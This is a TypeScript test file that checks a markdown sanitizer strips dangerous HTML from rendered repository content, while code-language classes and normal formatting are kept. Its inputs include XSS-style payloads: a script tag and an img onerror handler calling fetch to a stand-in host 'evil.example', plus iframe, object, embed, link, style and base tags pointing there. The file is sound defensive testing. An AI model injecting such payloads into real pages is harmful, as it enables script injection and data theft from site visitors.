import { describe, it, expect } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize from 'rehype-sanitize';
import { markdownSanitizeSchema } from '../src/lib/markdown-sanitize';

function render(markdown: string): string {
  return renderToStaticMarkup(
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      rehypePlugins={[rehypeRaw, [rehypeSanitize, markdownSanitizeSchema]]}
    >
      {markdown}
    </ReactMarkdown>,
  );
}

describe('markdown rendered from repository content', () => {
  it('drops the elements that reach the network or execute', () => {
    const html = render(
      [
        '<script>fetch("https://evil.example/steal")</script>',
        '<iframe src="https://evil.example/frame"></iframe>',
        '<object data="https://evil.example/o"></object>',
        '<embed src="https://evil.example/e"/>',
        '<link rel="stylesheet" href="https://evil.example/s.css"/>',
        '<style>@import url("https://evil.example/i.css");</style>',
        '<base href="https://evil.example/"/>',
      ].join('\n\n'),
    );

    expect(html).not.toContain('<script');
    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('<object');
    expect(html).not.toContain('<embed');
    expect(html).not.toContain('<link');
    expect(html).not.toContain('<style');
    expect(html).not.toContain('<base');
    // Disallowed elements leave their text behind as escaped, inert text; what must not
    // survive is a live reference to the host.
    expect(html).not.toMatch(/(?:src|href|data)="[^"]*evil\.example/);
  });

  it('drops event handler attributes', () => {
    const html = render('<img src="x" onerror="fetch(\'https://evil.example\')"/>');

    expect(html).not.toContain('onerror');
    expect(html).not.toContain('evil.example');
  });

  it('keeps the language class the code renderer needs', () => {
    const html = render('```ts\nconst a = 1\n```');

    expect(html).toContain('language-ts');
  });

  it('keeps ordinary formatting', () => {
    const html = render('# Title\n\n**bold** and a [link](https://example.com)\n\n| a | b |\n| - | - |\n| 1 | 2 |');

    expect(html).toContain('<h1>Title</h1>');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<table>');
  });
});
